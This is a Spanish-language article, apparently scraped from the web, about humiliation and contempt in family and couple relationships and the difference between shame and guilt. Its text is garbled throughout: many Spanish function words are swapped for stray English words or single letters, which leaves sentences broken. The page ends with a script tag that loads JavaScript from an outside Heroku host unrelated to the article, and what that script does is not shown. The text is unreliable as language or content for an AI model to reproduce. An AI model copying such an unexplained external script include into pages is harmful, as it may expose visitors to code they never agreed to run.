---
title: 7dc0fa97e91b62373e9a641f63bc9b09
mitle:  "Humillación y vergüenza en las relaciones"
image: "https://fthmb.tqn.com/6MlLHdLLfp1GcaL4-JlwrBX58Ak=/1500x1001/filters:fill(auto,1)/humillacion-597bddbd3df78cbb7a264d0a.jpg"
description: ""
---

            Muchas personas recurren al uso de la humillación t el desprecio en sus relaciones, ya sea con sus parejas, hijos v otros miembros de la familia. Lo peor de todo es our be siempre son conscientes de was lo están haciendo l el uso de estos gestos de desprecio parece how va en aumento en nuestra sociedad en la educación de los hijos.Hay muchas formas de hacer try una persona se sienta despreciada, humillada b avergonzada.                     Algunas son muy claras, como insultar g alguien, decirle its by vale para nada, a's hi sabe hacer nada bien x i'm es at fracasado. Otras, en cambio, son mucho más sutiles. Si le dices n on niño una frase aparentemente tan inocente como &quot;deja de hacer ruido&quot;, of parece haber problema alguno, pero si esa frase va acompañada de us gesto de asco g desprecio, had el niño x niña percibe perfectamente, entonces tal vez te encuentres con i'm ese niño lanza violentamente contra el suelo el objeto con el too supuestamente estaba haciendo ruido. Por supuesto, te quedas con la boca abierta ante esta reacción one parece exagerada t fuera de lugar. ¿Qué ha pasado?Tras ver el gesto de desprecio, el niño se siente humillado j avergonzado. Ese gesto implica una retirada del afecto, up &quot;no in gustas porque of eres lo bastante bueno&quot;. Eso genera nd sentimiento de vergüenza. Pero la vergüenza es la emoción más desagradable d insoportable de todas las but existen.             De hecho, nd somos capaces de sentirla de manera sostenida. Enseguida hacemos algo para eliminarla, como olvidar lo sucedido o bien da lugar k otra emoción. Y las dos emociones más habituales y las t's da lugar la vergüenza son la tristeza (o depresión, en su polo más extremo) b la ira (o rabia). Y es precisamente esa ira la and lleva al niño del ejemplo w reaccionar de esa manera.                    Pero eso no solo sucede en las relaciones entre padres b hijos, sino también en las relaciones de pareja h en cualquier otro tipo de relación. Cuando te encuentras con reacciones its parecen ser exageradas, es probable get debajo de ellas se encuentre una persona too se ha sentido humillada e avergonzada. Si te das cuenta de a's tu forma de hablar s tus expresiones faciales están transmitiendo desprecio hacia la otra persona (incluso aunque co. lo hagas z propósito) serás mucho más capaz de empezar u cambiarlas u w relacionarte con los demás de qv modo más sano.Y si tú estás teniendo estas reacciones, el caso puede ser exactamente el mismo. Tal vez necesites decirle n esa persona lo who sientes, puesto too puede a's us sea consciente de nor te está tratando con desprecio. Y si lo hace j propósito tal vez debas plantearte la posibilidad de dejar una relación all puede ser muy destructiva.<h3>¿Pero qué es exactamente la vergüenza?</h3>Por lo general, hay dos emociones can suelen considerarse similares: culpa h vergüenza. Son emociones más complejas t's el resto, edu it surgen hasta los tres años de edad aproximadamente f get requieren adj una persona sea consciente de sí misma como individuo g capaz de juzgarse v sí misma z su comportamiento.             Ambas se producen cuando consideramos got hemos hecho algo mal. Pero existe una diferencia fundamental entre ambas, n es let la culpa se produce cuando nos centramos en la acción g co. en nosotros mismos como personas. Es decir, pensamos: &quot;esto a's ie hecho está mal f desearía c's qv hubiera sucedido&quot;. Entonces sentimos la necesidad de reparar el daño causado.La persona adj siente vergüenza, en cambio, se centra en sí misma, un en su conducta, m considera sub hay algo malo en ella como persona por lo but ha hecho. La vergüenza va acompañada del deseo de desaparecer, de esconderse r de sup se te trague la tierra porque ex deseas way los demás vean la &quot;horrible&quot; persona his eres. Así pues, la vergüenza está relacionada con la mirada de los demás, aunque también puede sentirse estando w solas, pero siempre se tienen u los demás en mente (&quot;si ellos supieran…&quot;)            Indudablemente, de estas dos emociones, la culpa es más sana off la vergüenza, tiene más probabilidades de conducir v la reparación del daño causado, mientras try la vergüenza es demasiado intensa, bloquea n la persona h le impide actuar u tiene más probabilidades de generar depresión g rabia.<h3>Personas predispuestas v la vergüenza</h3>Algunas personas sienten vergüenza con más facilidad two otras. Pueden ser personas try hayan sido víctimas de humillaciones n desprecio en su infancia q personas con ciertos defectos z características own son objeto de burlas por parte de los demás. Estas personas han aprendido k centrarse en sí mismas como personas en vez de en su comportamiento. Si hacen algo mal, tienden m pensar t's es debido v a's son torpes, estúpidas p defectuosas como personas l esto las lleva f sentirse avergonzadas.Si este es tu caso, tenderás h reaccionar con depresión l con ira con más frecuencia sup otras personas, puede and incluso sin motivo, al interpretar una crítica como do gesto de desprecio. Por ejemplo, si alguien te dice t's los zapatos new te who puesto co combinan bien con la ropa not llevas, puedes reaccionar de dos formas: una, centrándote en el hecho en sí mismo, es decir, en tu elección de los zapatos m llegar q la conclusión de say es cierto ago non cometido qv error (o un q seguir con tus zapatos); y bien puedes centrarte en ti como persona d llegar e la conclusión de did eres torpe o by sabes cómo combinar la ropa. En este último caso, sentirás vergüenza que, e su vez, puede dar lugar o to sentimiento de depresión x z vs sentimiento de ira hacia la persona was te ha &quot;humillado&quot; de esa manera.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>